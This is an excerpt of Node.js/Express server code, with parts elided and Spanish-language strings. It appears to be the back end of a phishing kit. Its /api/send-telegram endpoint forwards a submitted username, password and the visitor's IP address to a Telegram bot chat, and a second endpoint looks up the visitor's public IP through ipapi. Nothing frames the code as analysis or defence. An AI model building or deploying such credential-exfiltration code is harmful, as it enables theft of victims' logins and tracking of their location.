...
app.post("/api/send-telegram", async (req, res) => {
  try {
    ...
    let clientIp = typeof ip === "string" && ip.trim() ? ip.trim() : "Sin IP";
    if (clientIp === "Sin IP") {
    ...
    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      ...
      body: JSON.stringify({
        chat_id: chatId,
        text: buildTelegramMessage({ username, password, ip: clientIp }),
      }),
    });
...
app.get("/api/ip", async (req, res) => {
  const fallbackIp = resolveClientIp(req);
  try {
    ...
    if (response.ok) {
      ...
      const resolved = data?.ip || fallbackIp;
      return res.status(200).json({
        ip: resolved,
        source: "ipapi",
        timestamp: new Date().toISOString(),
    ...
    console.warn("No se pudo resolver IP via ipapi:", error);
  }
